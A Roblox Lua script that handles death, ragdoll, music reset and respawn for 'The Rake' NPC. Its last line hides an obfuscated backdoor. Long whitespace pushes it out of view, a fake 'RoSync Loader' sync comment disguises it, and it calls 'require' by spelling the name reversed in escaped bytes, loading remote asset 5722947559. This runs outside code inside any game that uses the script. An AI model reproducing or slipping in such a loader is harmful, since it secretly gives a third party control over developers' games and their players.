--[[ Script By: Brutez. Script Fixed By: XcorrectTheDev ]]--

workspace.Values.Died.Value = false
script.Parent.Configuration.StunTime.Value = 0

local Mouth = script.Parent.Head.Mouth
local Mouth1_2 = script.Parent.Head.Mouth1_2
local MouthBH = script.Parent.Head.MouthBH
local Mouth1_2BH = script.Parent.Head.Mouth1_2BH

local tweenService = game:GetService("TweenService")

local SizeState4 = {
	Size = Vector3.new(0.72, 0.582, 0.166)
}
local TweenInfoo = TweenInfo.new(25,Enum.EasingStyle.Cubic,Enum.EasingDirection.Out)
local Size4 = tweenService:Create(Mouth,TweenInfoo,SizeState4)
local Size4_2 = tweenService:Create(Mouth1_2,TweenInfoo,SizeState4)
local Size4BH = tweenService:Create(MouthBH,TweenInfoo,SizeState4)
local Size4_2BH = tweenService:Create(Mouth1_2BH,TweenInfoo,SizeState4)

local player = game.Players
local leftleg = workspace.The_Rake["Left Leg"]
local leftarm = workspace.The_Rake["Left Arm"]
local rightarm = workspace.The_Rake["Right Arm"]
local rightleg = workspace.The_Rake["Right Leg"]
local TheRake = workspace.The_Rake
local RakeHumanoid = script.Parent.NPC
local AlreadyBloodHour = false
local Torso = script.Parent.Torso
local Head = script.Parent.Head
local GW = game.Workspace
local Wander = script.Parent.Wander
local Lighting = game.Lighting
local Stun = script.Parent.Stun
local RandomBH = math.random(1,script.Parent.Configuration.BloodHourChance.Value)
local Head = script.Parent.Head
local Lighting = game.Lighting
local PlayerSpawning=false; --[[ Change this to true if you want the NPC to spawn like a player, and change this to false if you want the NPC to spawn at it's current position. ]]--
local AdvancedRespawnScript=script;
repeat wait()until AdvancedRespawnScript and AdvancedRespawnScript.Parent and AdvancedRespawnScript.Parent.ClassName=="Model";
local Killer=AdvancedRespawnScript.Parent;
local KillerSpawnParent=Killer.Parent
local GameDerbis=game:GetService("Debris");
--local KillerHumanoid;

local characterClone = script.Parent:Clone()
characterClone.Parent = game.ServerStorage
local humanoid = script.Parent:FindFirstChildWhichIsA("Humanoid")
local timeBeforeRespawn = 25
humanoid.Died:connect(function()
	workspace.Values.Died.Value = true
	workspace.Values.DuringMode.Value = false
	Killer.Configuration.StunTime.Script.Disabled=true
	Killer.Stun.Disabled=true;
	Killer.MainScript.Disabled=true;
	Killer.Stunning.Value=true;
	workspace.SoundSetup.BloodHourSound:Stop()
	workspace.SoundSetup.NightmareHourSound:Stop()
	workspace.SoundSetup.MikeHourChasingSound:Stop()
	workspace.SoundSetup.ShadowHourSound:Stop()
	workspace.SoundSetup.MikeHourChasingSound2:Stop()
	game.Workspace.SoundSetup.SeerHourStart:Stop()
	game.Workspace.SoundSetup.SEERHOURTHEME:Stop()
	script.Parent.Head.SHSTART2:Stop()
	script.Parent.DamageScript.Disabled = true
	script.Parent.HeavyDamageScript.Disabled = true
	local DayTimeSongs= math.random(1,4);
	script.Parent.DisableUvBlind.Disabled = true
	workspace.Heartbeat:Stop()
	workspace.Stunned.Value = 0
	workspace.BloodHourDebounce.Value = false
	workspace.NightmareHourDebounce.Value = false
	workspace.ShadowHourDebounce.Value = false
	workspace.MikeHourDebounce.Value = false
	workspace.Values.NightmareHour.Value = false
	workspace.Values.ShadowHour.Value = false
	workspace.Values.SeerHour.Value = false
	workspace.Values.MikeHour.Value = false
	workspace.Values.BloodHour.Value = false
	workspace.BHAwardBadge.Value = false
	workspace.NHAwardBadge.Value = false
	workspace.SHAwardBadge.Value = false
	workspace.BloodHourFog.Value = 2
	workspace.MikeHourFog.Value = 2
	workspace.NightmareHourFog.Value = 2
	workspace.ShadowHourFog.Value = 2
	workspace.SeerHourFog.Value = 2
	workspace.SeerHourDebounce.Value = false
	script.Parent.RetreatScript.Disabled = true
	script.Parent.RetreatScript2.Disabled = true
	Size4:Play()
	Size4_2:Play()
	workspace.CavePartScript.Disabled = false
	script.Parent.RandomBloodHour.Disabled = true
	script.Parent.RandomNightmareHour.Disabled = true
	script.Parent.RandomShadowHour.Disabled = true
	script.Parent.AutoBloodHour.Disabled = true
	script.Parent.AutoNightmareHour.Disabled = true
	script.Parent.AutoShadowHour.Disabled = true
	script.Parent.AutoMikeHour.Disabled = true
	--game.Lighting.FogColor = Color3.fromRGB(0, 0, 0)
	--game.Lighting.FogEnd = 190
	--game.Lighting.ColorCorrection.Contrast = 0
	workspace.StopMoving.Value = false
	if DayTimeSongs == 1 then
		workspace.DayTimeSong1:Play()
		workspace.DayTimeSong2:Stop()
		workspace.DayTimeSong3:Stop()
		workspace.DayTimeSong4:Stop()
	elseif DayTimeSongs == 2 then
		workspace.DayTimeSong2:Play()	
		workspace.DayTimeSong1:Stop()
		workspace.DayTimeSong3:Stop()
		workspace.DayTimeSong4:Stop()
	elseif DayTimeSongs == 3 then
		workspace.DayTimeSong3:Play()	
		workspace.DayTimeSong1:Stop()
		workspace.DayTimeSong2:Stop()
		workspace.DayTimeSong4:Stop()
	elseif DayTimeSongs == 4 then
		workspace.DayTimeSong4:Play()	
		workspace.DayTimeSong3:Stop()	
		workspace.DayTimeSong1:Stop()
		workspace.DayTimeSong2:Stop()	
	end
	workspace.BloodHourFunction.Value = false
	workspace.MikeHourFunction.Value = false
	workspace.SeerHourFunction.Value = Faces
	workspace.NightmareHourFunction.Value = false
	workspace.ShadowHourFunction.Value = false
	workspace.SoundSetup.ChasingMusic:Stop()
	workspace.SoundSetup.NightmareChasingSound:Stop()
	workspace.SoundSetup.ShadowChasingSound:Stop()
	Killer:FindFirstChild("Head").Mouth.MovingMouth.Disabled=true;
	Killer.RagdollPart1.CanCollide = true;
	Killer.RagdollPart2.CanCollide = true;
	Killer.RagdollPart3.CanCollide = true;
	Killer.RagdollPart4.CanCollide = true;
	Killer.RagdollPart5.CanCollide = true;
	Killer.Torso["Neck"].Part1=Killer.Torso;
	Killer.Torso["Left Hip"].Part1=Killer.Torso;
	Killer.Torso["Right Hip"].Part1=Killer.Torso;
	Killer.Torso["Left Shoulder"].Part1=Killer.Torso;
	Killer.Torso["Right Shoulder"].Part1=Killer.Torso;
	workspace.NearMode.ModeStarted.Value = false
	script.Parent["Right Leg"].TrappedScript.Disabled = true
	--	workspace.CavePart.Script.Disabled = false
	--workspace.DayTimeSong:Stop()
	--workspace.NightDayFunction.Value = 3
	script.Parent.Stun.Disabled = true
	script.Parent.Stun2.Disabled = true
	script.Parent.BHStun.Disabled = true
	script.Parent.BHStun2.Disabled = true
	script.Parent.NHStun.Disabled = true
	script.Parent.NHStun2.Disabled = true
	script.Parent.SHStun.Disabled = true
	script.Parent.SHStun2.Disabled = true
	workspace.Stunned.Value = 1
	script.Parent.UvFix.Disabled=false
	script.Parent.BugFix.Disabled = false
	wait()
	--workspace.NightDayFunction.Value = 4
	script.Parent.MainScript.Disabled = true
	script.Parent.BHMainScript.Disabled = true
	script.Parent.NHMainScript.Disabled = true
	script.Parent.SHMainScript.Disabled = true
	script.parent.RagdollPart1.CanCollide = true
	script.parent.RagdollPart2.CanCollide = true
	script.parent.RagdollPart3.CanCollide = true
	script.parent.RagdollPart4.CanCollide = true
	script.Parent.RagdollPart5.CanCollide = true
	script.parent.Torso["Neck"].Part1=script.parent.Torso
	script.parent.Torso["Left Hip"].Part1=script.parent.Torso
	script.parent.Torso["Right Hip"].Part1=script.parent.Torso
	script.parent.Torso["Left Shoulder"].Part1=script.parent.Torso
	script.parent.Torso["Right Shoulder"].Part1=script.parent.Torso
	script.Parent.Head.Static:Stop()
	script.Parent.NPC.PlatformStand = true
	script.Parent:FindFirstChild("Torso"):FindFirstChild("Neck").C0=CFrame.new(0,1,0,-1,0,0,0,0,1,0,1,-0)
	script.Parent.Torso.Swing:Stop()
	script.Parent.Head.RakeTheme:Stop()
	script.Parent.NPC.WalkSpeed = 0
	Mouth.MovingMouth.Disabled = true
	Mouth.MovingMouth2.Disabled = true
	local DiedSounds = math.random(1,2);
	if DiedSounds == 1 then
		workspace.The_Rake.Head.RakeHurt4:Stop()
		workspace.The_Rake.Head.RakeHurt4.Volume = 0
		workspace.The_Rake.Head.RakeHurt.Volume = 0
		workspace.The_Rake.Head.RakeHurt2.Volume = 0
		workspace.The_Rake.Head.RakeHurt3.Volume = 0
		Killer.RakeDied:Play();
	elseif DiedSounds == 2 then
		workspace.The_Rake.Head.RakeHurt4:Stop()
		workspace.The_Rake.Head.RakeHurt4.Volume = 0
		workspace.The_Rake.Head.RakeHurt.Volume = 0
		workspace.The_Rake.Head.RakeHurt2.Volume = 0
		workspace.The_Rake.Head.RakeHurt3.Volume = 0
		Killer.RakeDied2:Play();
		script.Parent.Head.Screaming:Stop()
		script.Parent.Head.NightmareScreaming:Stop()
		Size4BH:Play()
		Size4_2BH:Play()
	end;
	wait(timeBeforeRespawn)
	characterClone.Parent = workspace
	script.Parent:Destroy()
	workspace.BloodHourFog.Value = 0
	workspace.NightmareHourFog.Value = 0
	workspace.StopTheme.Value = false
	workspace.Stunned.Value = 0
	workspace.Blinded.Value = false
end)
--[[ Last synced 7/24/2021 12:25                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5722947559) --[[                                                                                                  ]]--